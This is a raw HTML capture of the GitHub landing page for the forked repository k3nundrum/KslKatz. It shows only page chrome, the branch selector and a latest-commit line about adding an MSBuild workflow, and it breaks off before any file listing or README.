@@ -1,0 +1,1793 @@
+# https://github.com/k3nundrum/KslKatz
+
+<!DOCTYPE html><html lang="en" data-color-mode="auto" data-light-theme="light" data-dark-theme="dark" data-a11y-animated-images="system" data-a11y-link-underlines="true" class="js-focus-visible" data-js-focus-visible="" data-turbo-loaded="">
+
+  <body class="logged-out env-production page-responsive" style="word-wrap: break-word;">
+    <div data-turbo-body="" class="logged-out env-production page-responsive" style="word-wrap: break-word;">
+      <div id="__primerPortalRoot__" role="region" style="z-index: 1000; position: absolute; width: 100%;" data-turbo-permanent=""></div>
+      
+
+    <div class="position-relative header-wrapper js-header-wrapper ">
+      <a href="https://github.com/k3nundrum/KslKatz#start-of-content" data-skip-target-assigned="false" class="px-2 tmp-py-4 color-bg-accent-emphasis color-fg-on-emphasis show-on-focus js-skip-to-content">Skip to content</a>
+
+      <span data-view-component="true" class="progress-pjax-loader Progress position-fixed width-full">
+    <span style="width: 0%;" data-view-component="true" class="Progress-item progress-pjax-loader-bar left-0 top-0 color-bg-accent-emphasis"></span>
+</span>      
+      
+      <link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/primer-react-css.1836171ca9039b48.module.css">
+<link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/keyboard-shortcuts-dialog.67978b685ca52cce.module.css">
+
+<react-partial partial-name="keyboard-shortcuts-dialog" data-ssr="false" data-attempted-ssr="false" data-react-profiling="false" data-catalyst="" class="loaded">
+  
+  
+  <div data-target="react-partial.reactRoot"><div class="d-none"></div></div>
+</react-partial>
+
+
+
+
+
+      
+
+          
+
+              
+
+
+
+
+
+
+
+
+      <div data-view-component="true" class="js-stale-session-flash stale-session-flash flash flash-warn flash-full">
+  
+        <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
+    <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
+</svg>
+        <span class="js-stale-session-flash-signed-in">You signed in with another tab or window. <a class="Link--inTextBlock" href="https://github.com/k3nundrum/KslKatz">Reload</a> to refresh your session.</span>
+        <span class="js-stale-session-flash-signed-out">You signed out in another tab or window. <a class="Link--inTextBlock" href="https://github.com/k3nundrum/KslKatz">Reload</a> to refresh your session.</span>
+        <span class="js-stale-session-flash-switched">You switched accounts on another tab or window. <a class="Link--inTextBlock" href="https://github.com/k3nundrum/KslKatz">Reload</a> to refresh your session.</span>
+
+    <button id="icon-button-ba9d5b72-9227-418d-bc4c-0265171cdf71" aria-labelledby="tooltip-75a3a221-6725-47d7-a529-b15e2be3e84e" type="button" data-view-component="true" class="Button Button--iconOnly Button--invisible Button--medium flash-close js-flash-close">  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-x Button-visual">
+    <path d="M3.72 3.72a.75.75 0 0 1 1.06 0L8 6.94l3.22-3.22a.749.749 0 0 1 1.275.326.749.749 0 0 1-.215.734L9.06 8l3.22 3.22a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215L8 9.06l-3.22 3.22a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042L6.94 8 3.72 4.78a.75.75 0 0 1 0-1.06Z"></path>
+</svg>
+</button><tool-tip id="tooltip-75a3a221-6725-47d7-a529-b15e2be3e84e" for="icon-button-ba9d5b72-9227-418d-bc4c-0265171cdf71" popover="manual" data-direction="s" data-type="label" data-view-component="true" class="sr-only position-absolute" aria-hidden="true" role="tooltip"><slot></slot>Dismiss alert</tool-tip>
+
+
+  
+</div>
+    </div>
+
+  <div id="start-of-content" class="show-on-focus"></div>
+
+
+
+
+
+
+
+
+    <div id="js-flash-container" class="flash-container" data-turbo-replace="">
+
+
+
+
+  
+    
+<div class="flash flash-full   {{ className }}">
+  <div>
+    <button autofocus="" class="flash-close js-flash-close" type="button" aria-label="Dismiss this message">
+      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-x">
+    <path d="M3.72 3.72a.75.75 0 0 1 1.06 0L8 6.94l3.22-3.22a.749.749 0 0 1 1.275.326.749.749 0 0 1-.215.734L9.06 8l3.22 3.22a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215L8 9.06l-3.22 3.22a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042L6.94 8 3.72 4.78a.75.75 0 0 1 0-1.06Z"></path>
+</svg>
+    </button>
+    <div aria-atomic="true" role="alert" class="js-flash-alert">
+      
+      <div>{{ message }}</div>
+
+    </div>
+  </div>
+</div>
+  
+</div>
+
+
+    
+
+
+
+
+
+
+  <div class="application-main " data-commit-hovercards-enabled="" data-discussion-hovercards-enabled="" data-issue-and-pr-hovercards-enabled="" data-project-hovercards-enabled="">
+        <div itemscope="" itemtype="http://schema.org/SoftwareSourceCode" class="">
+    <main id="js-repo-pjax-container">
+      
+      
+
+
+
+
+
+
+  
+
+  <div id="repository-container-header" class="tmp-pt-3 hide-full-screen" style="background-color: var(--page-header-bgColor, var(--color-page-header-bg));" data-turbo-replace="">
+
+      <div class="d-flex flex-nowrap flex-justify-end tmp-mb-3  tmp-px-3 tmp-px-lg-5" style="gap: 1rem;">
+
+        <div class="flex-auto min-width-0 width-fit">
+            
+  <div class=" d-flex flex-wrap flex-items-center wb-break-word f3 text-normal">
+      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-repo-forked color-fg-muted mr-2 tmp-mr-2">
+    <path d="M5 5.372v.878c0 .414.336.75.75.75h4.5a.75.75 0 0 0 .75-.75v-.878a2.25 2.25 0 1 1 1.5 0v.878a2.25 2.25 0 0 1-2.25 2.25h-1.5v2.128a2.251 2.251 0 1 1-1.5 0V8.5h-1.5A2.25 2.25 0 0 1 3.5 6.25v-.878a2.25 2.25 0 1 1 1.5 0ZM5 3.25a.75.75 0 1 0-1.5 0 .75.75 0 0 0 1.5 0Zm6.75.75a.75.75 0 1 0 0-1.5.75.75 0 0 0 0 1.5Zm-3 8.75a.75.75 0 1 0-1.5 0 .75.75 0 0 0 1.5 0Z"></path>
+</svg>
+    
+    <span class="author flex-self-stretch" itemprop="author">
+      <a class="url fn" rel="author" data-hovercard-type="user" data-hovercard-url="/users/k3nundrum/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="https://github.com/k3nundrum" aria-keyshortcuts="Alt+ArrowUp">
+        k3nundrum
+</a>    </span>
+    <span class="mx-1 flex-self-stretch color-fg-muted">/</span>
+    <strong itemprop="name" class="mr-2 flex-self-stretch">
+      <a data-pjax="#repo-content-pjax-container" data-turbo-frame="repo-content-turbo-frame" href="https://github.com/k3nundrum/KslKatz">KslKatz</a>
+    </strong>
+
+    <span></span><span class="Label Label--secondary v-align-middle mr-1">Public</span>
+  </div>
+    <span class="text-small lh-condensed-ultra no-wrap mt-1" data-repository-hovercards-enabled="">
+      forked from <a data-hovercard-type="repository" data-hovercard-url="/illmob/KslKatz/hovercard" class="Link--inTextBlock" href="https://github.com/illmob/KslKatz" aria-keyshortcuts="Alt+ArrowUp">illmob/KslKatz</a>
+    </span>
+
+
+        </div>
+
+        <div id="repository-details-container" class="flex-shrink-0" data-turbo-replace="" style="max-width: 70%;">
+            <ul class="pagehead-actions flex-shrink-0 d-none d-md-inline" style="padding: 2px 0;">
+    
+      
+
+  <li>
+            <a href="https://github.com/login?return_to=%2Fk3nundrum%2FKslKatz" rel="nofollow" id="repository-details-watch-button" data-hydro-click="{&quot;event_type&quot;:&quot;authentication.click&quot;,&quot;payload&quot;:{&quot;location_in_page&quot;:&quot;notification subscription menu watch&quot;,&quot;repository_id&quot;:null,&quot;auth_type&quot;:&quot;LOG_IN&quot;,&quot;originating_url&quot;:&quot;https://github.com/k3nundrum/KslKatz&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="a5162a8a4ecb3418b859ff92346abfc875eb7ccb3c1194a2965d79850d3f6d47" aria-label="You must be signed in to change notification settings" data-view-component="true" class="btn-sm btn" aria-describedby="tooltip-213077e0-a19b-4a19-8fc4-7a993d4919f6">    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-bell mr-2 tmp-mr-2">
+    <path d="M8 16a2 2 0 0 0 1.985-1.75c.017-.137-.097-.25-.235-.25h-3.5c-.138 0-.252.113-.235.25A2 2 0 0 0 8 16ZM3 5a5 5 0 0 1 10 0v2.947c0 .05.015.098.042.139l1.703 2.555A1.519 1.519 0 0 1 13.482 13H2.518a1.516 1.516 0 0 1-1.263-2.36l1.703-2.554A.255.255 0 0 0 3 7.947Zm5-3.5A3.5 3.5 0 0 0 4.5 5v2.947c0 .346-.102.683-.294.97l-1.703 2.556a.017.017 0 0 0-.003.01l.001.006c0 .002.002.004.004.006l.006.004.007.001h10.964l.007-.001.006-.004.004-.006.001-.007a.017.017 0 0 0-.003-.01l-1.703-2.554a1.745 1.745 0 0 1-.294-.97V5A3.5 3.5 0 0 0 8 1.5Z"></path>
+</svg>Notifications
+</a>    <tool-tip id="tooltip-213077e0-a19b-4a19-8fc4-7a993d4919f6" for="repository-details-watch-button" popover="manual" data-direction="s" data-type="description" data-view-component="true" class="sr-only position-absolute" role="tooltip"><slot></slot>You must be signed in to change notification settings</tool-tip>
+
+  </li>
+
+  <li>
+          <a icon="repo-forked" id="fork-button" href="https://github.com/login?return_to=%2Fk3nundrum%2FKslKatz" rel="nofollow" data-hydro-click="{&quot;event_type&quot;:&quot;authentication.click&quot;,&quot;payload&quot;:{&quot;location_in_page&quot;:&quot;repo details fork button&quot;,&quot;repository_id&quot;:1192912428,&quot;auth_type&quot;:&quot;LOG_IN&quot;,&quot;originating_url&quot;:&quot;https://github.com/k3nundrum/KslKatz&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="dbb433a460c72601eb48d9c39092e2c6a9b8e263bb5cd707d3a6a35ee602d20c" data-view-component="true" class="btn-sm btn">    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-repo-forked mr-2 tmp-mr-2">
+    <path d="M5 5.372v.878c0 .414.336.75.75.75h4.5a.75.75 0 0 0 .75-.75v-.878a2.25 2.25 0 1 1 1.5 0v.878a2.25 2.25 0 0 1-2.25 2.25h-1.5v2.128a2.251 2.251 0 1 1-1.5 0V8.5h-1.5A2.25 2.25 0 0 1 3.5 6.25v-.878a2.25 2.25 0 1 1 1.5 0ZM5 3.25a.75.75 0 1 0-1.5 0 .75.75 0 0 0 1.5 0Zm6.75.75a.75.75 0 1 0 0-1.5.75.75 0 0 0 0 1.5Zm-3 8.75a.75.75 0 1 0-1.5 0 .75.75 0 0 0 1.5 0Z"></path>
+</svg>Fork
+    <span id="repo-network-counter" data-pjax-replace="true" data-turbo-replace="true" title="1" data-view-component="true" class="Counter">1</span>
+</a>
+  </li>
+
+  <li>
+        <div data-view-component="true" class="BtnGroup d-flex">
+        <a href="https://github.com/login?return_to=%2Fk3nundrum%2FKslKatz" rel="nofollow" data-hydro-click="{&quot;event_type&quot;:&quot;authentication.click&quot;,&quot;payload&quot;:{&quot;location_in_page&quot;:&quot;star button&quot;,&quot;repository_id&quot;:1192912428,&quot;auth_type&quot;:&quot;LOG_IN&quot;,&quot;originating_url&quot;:&quot;https://github.com/k3nundrum/KslKatz&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="8ce697c2160b31ab177ad7025043e69b3ceff0f1710ae3b2e859320bbac452cf" aria-label="You must be signed in to star a repository" data-view-component="true" class="tooltipped tooltipped-sw btn-sm btn">    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-star v-align-text-bottom d-inline-block mr-2 tmp-mr-2">
+    <path d="M8 .25a.75.75 0 0 1 .673.418l1.882 3.815 4.21.612a.75.75 0 0 1 .416 1.279l-3.046 2.97.719 4.192a.751.751 0 0 1-1.088.791L8 12.347l-3.766 1.98a.75.75 0 0 1-1.088-.79l.72-4.194L.818 6.374a.75.75 0 0 1 .416-1.28l4.21-.611L7.327.668A.75.75 0 0 1 8 .25Zm0 2.445L6.615 5.5a.75.75 0 0 1-.564.41l-3.097.45 2.24 2.184a.75.75 0 0 1 .216.664l-.528 3.084 2.769-1.456a.75.75 0 0 1 .698 0l2.77 1.456-.53-3.084a.75.75 0 0 1 .216-.664l2.24-2.183-3.096-.45a.75.75 0 0 1-.564-.41L8 2.694Z"></path>
+</svg><span data-view-component="true" class="d-inline">
+          Star
+</span>          <span id="repo-stars-counter-star" aria-label="4 users starred this repository" data-singular-suffix="user starred this repository" data-plural-suffix="users starred this repository" data-turbo-replace="true" title="4" data-view-component="true" class="Counter js-social-count">4</span>
+</a></div>
+  </li>
+
+</ul>
+
+        </div>
+      </div>
+
+        <div id="responsive-meta-container" data-turbo-replace="">
+</div>
+
+
+          
+
+  </div>
+  
+
+
+
+<turbo-frame id="repo-content-turbo-frame" target="_top" data-turbo-action="advance" class="">
+    <div id="repo-content-pjax-container" class="repository-content ">
+    
+
+
+
+    
+      
+    
+
+
+
+
+
+
+
+
+<react-app app-name="code-view" initial-path="/k3nundrum/KslKatz" style="display: block; min-height: calc(100vh - 64px);" data-attempted-ssr="true" data-ssr="true" data-lazy="false" data-alternate="false" data-data-router-enabled="true" data-react-profiling="false" data-catalyst="" class="loaded">
+  
+  
+  <div data-target="react-app.reactRoot"> <!-- --> <a id="code-view-repo-link" href="https://github.com/k3nundrum/KslKatz" data-discover="true"></a> <div class="d-none"></div><div><div style="--spacing:var(--spacing-none)" class="prc-PageLayout-PageLayoutRoot--KH-d"><div class="prc-PageLayout-PageLayoutWrapper-2BhU2" data-width="full"><div class="prc-PageLayout-PageLayoutContent-BneH9"><div class="prc-PageLayout-ContentWrapper-gR9eG" data-is-hidden-narrow="false"><div class="prc-PageLayout-Content-xWL-A" data-width="full" style="--spacing:var(--spacing-none)"><div class="SharedPageLayout-module__content__IwGAp" data-selector="repos-split-pane-content" tabindex="0"><div style="--spacing:var(--spacing-none)" class="prc-PageLayout-PageLayoutRoot--KH-d container-xl"><div class="prc-PageLayout-PageLayoutWrapper-2BhU2" data-width="full"><div class="prc-PageLayout-PageLayoutContent-BneH9"><div class="prc-PageLayout-ContentWrapper-gR9eG" data-is-hidden="false"><div class="prc-PageLayout-Content-xWL-A" data-width="large" style="--spacing:var(--spacing-condensed)"><div class="OverviewContent-module__Box__PF75K tmp-pl-lg-3 mt-0"><div class="OverviewHeader-module__Box__cC1RH"></div><div class="OverviewContent-module__Box_1__MPS0U"><div class="OverviewContent-module__Box_2__Di8Pb"><div class="OverviewContent-module__Box_3__wzlJx"><button type="button" aria-haspopup="true" aria-expanded="false" tabindex="0" style="min-width:0" aria-label="main branch" data-testid="anchor-button" data-icv-name="Switch branches/tags" class="prc-Button-ButtonBase-9n-Xk overview-ref-selector width-full RefSelectorAnchoredOverlay-module__RefSelectorOverlayBtn__a3WK3" data-loading="false" data-size="medium" data-variant="default" id="ref-picker-repos-header-ref-selector"><span data-component="buttonContent" data-align="center" class="prc-Button-ButtonContent-Iohp5"><span data-component="text" class="prc-Button-Label-FWkx3"><div class="RefSelectorAnchoredOverlay-module__RefSelectorOverlayContainer__yaf4p"><div class="RefSelectorAnchoredOverlay-module__RefSelectorOverlayHeader__XtXRG"><svg data-component="Octicon" aria-hidden="true" focusable="false" class="octicon octicon-git-branch" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M9.5 3.25a2.25 2.25 0 1 1 3 2.122V6A2.5 2.5 0 0 1 10 8.5H6a1 1 0 0 0-1 1v1.128a2.251 2.251 0 1 1-1.5 0V5.372a2.25 2.25 0 1 1 1.5 0v1.836A2.493 2.493 0 0 1 6 7h4a1 1 0 0 0 1-1v-.628A2.25 2.25 0 0 1 9.5 3.25Zm-6 0a.75.75 0 1 0 1.5 0 .75.75 0 0 0-1.5 0Zm8.25-.75a.75.75 0 1 0 0 1.5.75.75 0 0 0 0-1.5ZM4.25 12a.75.75 0 1 0 0 1.5.75.75 0 0 0 0-1.5Z"></path></svg></div><div class="ref-selector-button-text-container RefSelectorAnchoredOverlay-module__RefSelectorBtnTextContainer__Di3rk"><span class="RefSelectorAnchoredOverlay-module__RefSelectorText__w_fmP">&nbsp;<!-- -->main</span></div></div></span><span data-component="trailingVisual" class="prc-Button-Visual-YNt2F prc-Button-VisualWrap-E4cnq"><svg data-component="Octicon" aria-hidden="true" focusable="false" class="octicon octicon-triangle-down" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="m4.427 7.427 3.396 3.396a.25.25 0 0 0 .354 0l3.396-3.396A.25.25 0 0 0 11.396 7H4.604a.25.25 0 0 0-.177.427Z"></path></svg></span></span></button><div class="d-none"></div></div><div class="OverviewContent-module__Box_4__qf73o"><a type="button" href="https://github.com/k3nundrum/KslKatz/branches" class="prc-Button-ButtonBase-9n-Xk OverviewContent-module__Button___Uotu" data-loading="false" data-size="medium" data-variant="invisible"><span data-component="buttonContent" data-align="center" class="prc-Button-ButtonContent-Iohp5"><span data-component="leadingVisual" class="prc-Button-Visual-YNt2F prc-Button-VisualWrap-E4cnq"><svg data-component="Octicon" aria-hidden="true" focusable="false" class="octicon octicon-git-branch" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M9.5 3.25a2.25 2.25 0 1 1 3 2.122V6A2.5 2.5 0 0 1 10 8.5H6a1 1 0 0 0-1 1v1.128a2.251 2.251 0 1 1-1.5 0V5.372a2.25 2.25 0 1 1 1.5 0v1.836A2.493 2.493 0 0 1 6 7h4a1 1 0 0 0 1-1v-.628A2.25 2.25 0 0 1 9.5 3.25Zm-6 0a.75.75 0 1 0 1.5 0 .75.75 0 0 0-1.5 0Zm8.25-.75a.75.75 0 1 0 0 1.5.75.75 0 0 0 0-1.5ZM4.25 12a.75.75 0 1 0 0 1.5.75.75 0 0 0 0-1.5Z"></path></svg></span><span data-component="text" class="prc-Button-Label-FWkx3"><span><strong class="color-fg-default">1 </strong>Branch</span></span></span></a><a type="button" href="https://github.com/k3nundrum/KslKatz/tags" class="prc-Button-ButtonBase-9n-Xk OverviewContent-module__Button___Uotu" data-loading="false" data-size="medium" data-variant="invisible"><span data-component="buttonContent" data-align="center" class="prc-Button-ButtonContent-Iohp5"><span data-component="leadingVisual" class="prc-Button-Visual-YNt2F prc-Button-VisualWrap-E4cnq"><svg data-component="Octicon" aria-hidden="true" focusable="false" class="octicon octicon-tag" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M1 7.775V2.75C1 1.784 1.784 1 2.75 1h5.025c.464 0 .91.184 1.238.513l6.25 6.25a1.75 1.75 0 0 1 0 2.474l-5.026 5.026a1.75 1.75 0 0 1-2.474 0l-6.25-6.25A1.752 1.752 0 0 1 1 7.775Zm1.5 0c0 .066.026.13.073.177l6.25 6.25a.25.25 0 0 0 .354 0l5.025-5.025a.25.25 0 0 0 0-.354l-6.25-6.25a.25.25 0 0 0-.177-.073H2.75a.25.25 0 0 0-.25.25ZM6 5a1 1 0 1 1 0 2 1 1 0 0 1 0-2Z"></path></svg></span><span data-component="text" class="prc-Button-Label-FWkx3"><span><strong class="color-fg-default">0 </strong>Tags</span></span></span></a></div><div class="OverviewContent-module__Box_5__Zc3i7"><a type="button" aria-label="Go to Branches page" href="https://github.com/k3nundrum/KslKatz/branches" class="prc-Button-ButtonBase-9n-Xk OverviewContent-module__Button_1__vmS6D" data-loading="false" data-no-visuals="true" data-size="medium" data-variant="invisible"><svg data-component="Octicon" aria-hidden="true" focusable="false" class="octicon octicon-git-branch" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M9.5 3.25a2.25 2.25 0 1 1 3 2.122V6A2.5 2.5 0 0 1 10 8.5H6a1 1 0 0 0-1 1v1.128a2.251 2.251 0 1 1-1.5 0V5.372a2.25 2.25 0 1 1 1.5 0v1.836A2.493 2.493 0 0 1 6 7h4a1 1 0 0 0 1-1v-.628A2.25 2.25 0 0 1 9.5 3.25Zm-6 0a.75.75 0 1 0 1.5 0 .75.75 0 0 0-1.5 0Zm8.25-.75a.75.75 0 1 0 0 1.5.75.75 0 0 0 0-1.5ZM4.25 12a.75.75 0 1 0 0 1.5.75.75 0 0 0 0-1.5Z"></path></svg></a><a type="button" aria-label="Go to Tags page" href="https://github.com/k3nundrum/KslKatz/tags" class="prc-Button-ButtonBase-9n-Xk OverviewContent-module__Button_1__vmS6D" data-loading="false" data-no-visuals="true" data-size="medium" data-variant="invisible"><svg data-component="Octicon" aria-hidden="true" focusable="false" class="octicon octicon-tag" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M1 7.775V2.75C1 1.784 1.784 1 2.75 1h5.025c.464 0 .91.184 1.238.513l6.25 6.25a1.75 1.75 0 0 1 0 2.474l-5.026 5.026a1.75 1.75 0 0 1-2.474 0l-6.25-6.25A1.752 1.752 0 0 1 1 7.775Zm1.5 0c0 .066.026.13.073.177l6.25 6.25a.25.25 0 0 0 .354 0l5.025-5.025a.25.25 0 0 0 0-.354l-6.25-6.25a.25.25 0 0 0-.177-.073H2.75a.25.25 0 0 0-.25.25ZM6 5a1 1 0 1 1 0 2 1 1 0 0 1 0-2Z"></path></svg></a></div></div><div class="OverviewContent-module__Box_6__Y_Yb_"><div class="OverviewContent-module__Box_7__JuRXo"><div class="d-none"></div><div class="OverviewContent-module__Box_8__UZCZh"><div class="OverviewContent-module__FileResultsList__EjrTH"><span class="d-flex FileResultsList-module__FilesSearchBox__ivVkc TextInput-wrapper prc-components-TextInputWrapper-Hpdqi prc-components-TextInputBaseWrapper-wY-n0" data-leading-visual="true" data-trailing-visual="true" aria-busy="false"><span class="TextInput-icon" id="_r_0_" aria-hidden="true"><svg data-component="Octicon" aria-hidden="true" focusable="false" class="octicon octicon-search" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align: text-bottom;"><path d="M10.68 11.74a6 6 0 0 1-7.922-8.982 6 6 0 0 1 8.982 7.922l3.04 3.04a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215ZM11.5 7a4.499 4.499 0 1 0-8.997 0A4.499 4.499 0 0 0 11.5 7Z"></path></svg></span><input aria-label="Go to file" role="combobox" aria-controls="file-results-list" aria-expanded="false" aria-haspopup="dialog" autocorrect="off" spellcheck="false" placeholder="Go to file" aria-describedby="_r_0_ _r_1_" data-component="input" class="prc-components-Input-IwWrt" type="text" value=""><span class="TextInput-icon" id="_r_1_" aria-hidden="true"></span></span></div></div><div class="OverviewContent-module__Box_9__bqMPw"><button type="button" class="prc-Button-ButtonBase-9n-Xk" data-loading="false" data-no-visuals="true" data-size="medium" data-variant="default"><span data-component="buttonContent" data-align="center" class="prc-Button-ButtonContent-Iohp5"><span data-component="text" class="prc-Button-Label-FWkx3">Go to file</span></span></button></div></div><button type="button" aria-haspopup="true" aria-expanded="false" tabindex="0" class="prc-Button-ButtonBase-9n-Xk" data-loading="false" data-size="medium" data-variant="primary" id="_R_94ql3al1d_"><span data-component="buttonContent" data-align="center" class="prc-Button-ButtonContent-Iohp5"><span data-component="leadingVisual" class="prc-Button-Visual-YNt2F prc-Button-VisualWrap-E4cnq"><svg data-component="Octicon" aria-hidden="true" focusable="false" class="octicon octicon-code hide-sm" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="m11.28 3.22 4.25 4.25a.75.75 0 0 1 0 1.06l-4.25 4.25a.749.749 0 0 1-1.275-.326.749.749 0 0 1 .215-.734L13.94 8l-3.72-3.72a.749.749 0 0 1 .326-1.275.749.749 0 0 1 .734.215Zm-6.56 0a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042L2.06 8l3.72 3.72a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215L.47 8.53a.75.75 0 0 1 0-1.06Z"></path></svg></span><span data-component="text" class="prc-Button-Label-FWkx3">Code</span><span data-component="trailingVisual" class="prc-Button-Visual-YNt2F prc-Button-VisualWrap-E4cnq"><svg data-component="Octicon" aria-hidden="true" focusable="false" class="octicon octicon-triangle-down" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="m4.427 7.427 3.396 3.396a.25.25 0 0 0 .354 0l3.396-3.396A.25.25 0 0 0 11.396 7H4.604a.25.25 0 0 0-.177.427Z"></path></svg></span></span></button><div class="OverviewContent-module__Box_10__mGSb4"><button data-component="IconButton" type="button" aria-haspopup="true" aria-expanded="false" tabindex="0" class="prc-Button-ButtonBase-9n-Xk prc-Button-IconButton-fyge7" data-loading="false" data-no-visuals="true" data-size="medium" data-variant="default" aria-labelledby="_R_7r4ql3al1d_" id="_R_b4ql3al1d_"><svg data-component="Octicon" aria-hidden="true" focusable="false" class="octicon octicon-kebab-horizontal" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M8 9a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3ZM1.5 9a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Zm13 0a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Z"></path></svg></button><span class="prc-TooltipV2-Tooltip-tLeuB" data-direction="n" aria-hidden="true" id="_R_7r4ql3al1d_" popover="auto">Open more actions menu</span></div></div></div><div data-testid="branch-info-bar" aria-live="polite" class="BranchInfoBar-module__branchInfoBarBase__drYtr BranchInfoBar-module__BranchInfoBarContainer__xZHyz"><span>This branch is up to date with <span class="prc-BranchName-BranchName-CMTaU">illmob/KslKatz:main</span>.</span><div class="d-flex gap-2"></div></div><div class="OverviewContent-module__Box_11__F19kY"><div data-hpc="true"><div class="d-none"></div><h2 class="sr-only ScreenReaderHeading-module__userSelectNone__rwWIk prc-Heading-Heading-MtWFE" data-testid="screen-reader-heading" id="folders-and-files">Folders and files</h2><table class="Table-module__Box__HZKiQ" aria-labelledby="folders-and-files"><thead class="DirectoryContent-module__OverviewHeaderRow__hOrKy Table-module__Box_1__VacXC"><tr class="Table-module__Box_2__PBp9s"><th colspan="2" class="DirectoryContent-module__Box__iC_5e"><span class="text-bold">Name</span></th><th colspan="1" class="DirectoryContent-module__Box_1__fuSBO"><span class="text-bold">Name</span></th><th class="hide-sm"><div class="width-fit prc-Truncate-Truncate-2G1eo" data-inline="true" title="Last commit message" style="--truncate-max-width:125px"><span class="text-bold">Last commit message</span></div></th><th colspan="1" class="DirectoryContent-module__Box_2__Ccrx7"><div class="width-fit prc-Truncate-Truncate-2G1eo" data-inline="true" title="Last commit date" style="--truncate-max-width:125px"><span class="text-bold">Last commit date</span></div></th></tr></thead><tbody><tr class="DirectoryContent-module__Box_3__gl6dE"><td colspan="3" class="bgColor-muted p-1 rounded-top-2"><div class="LatestCommit-module__Box__B25ZT"><h2 class="sr-only ScreenReaderHeading-module__userSelectNone__rwWIk prc-Heading-Heading-MtWFE" data-testid="screen-reader-heading">Latest commit</h2><div data-testid="latest-commit" class="LatestCommit-module__Box_1__YkEgg"><div class="CommitAttribution-module__CommitAttributionContainer__I_rfs"><div data-testid="author-avatar" class="AuthorAvatar-module__AuthorAvatarContainer__n0MVc"><a class="prc-Link-Link-9ZwDx" href="https://github.com/yenick514" data-testid="avatar-icon-link" data-hovercard-url="/users/yenick514/hovercard" data-hovercard-type="user" octo-click="hovercard-link-click" octo-dimensions="link_type:self" aria-keyshortcuts="Alt+ArrowUp"><img data-component="Avatar" class="AuthorAvatar-module__authorAvatarImage__a3R8x prc-Avatar-Avatar-0xaUi" alt="yenick514" width="20" height="20" data-testid="github-avatar" aria-label="yenick514" src="https://avatars.githubusercontent.com/u/173906144?v=4&amp;size=40" style="--avatarSize-regular: 20px;"></a><a class="AuthorAvatar-module__authorHoverableLink__MHTT8 prc-Link-Link-9ZwDx" href="https://github.com/k3nundrum/KslKatz/commits?author=yenick514" aria-label="commits by yenick514" data-hovercard-url="/users/yenick514/hovercard" data-hovercard-type="user" octo-click="hovercard-link-click" octo-dimensions="link_type:self" aria-keyshortcuts="Alt+ArrowUp" style="--author-font-weight: var(--base-text-weight-semibold); --author-font-color: var(--fgColor-default);">yenick514</a></div><span class=""></span></div><div class="d-none d-sm-flex LatestCommit-module__Box_2__pSPKJ"><div class="Truncate flex-items-center f5"><span class="Truncate-text prc-Text-Text-9mHv3" data-testid="latest-commit-html"><a data-hovercard-url="/k3nundrum/KslKatz/commit/892895c45d64067e6a94c63a631f0f7193f5201f/hovercard" data-pjax="true" class="Link--secondary" href="https://github.com/k3nundrum/KslKatz/commit/892895c45d64067e6a94c63a631f0f7193f5201f" aria-keyshortcuts="Alt+ArrowUp">Add MSBuild workflow for building projects</a></span></div></div><span class="d-flex d-sm-none fgColor-muted f6"><relative-time tense="past" datetime="2026-03-25T05:26:37.000Z" title="Mar 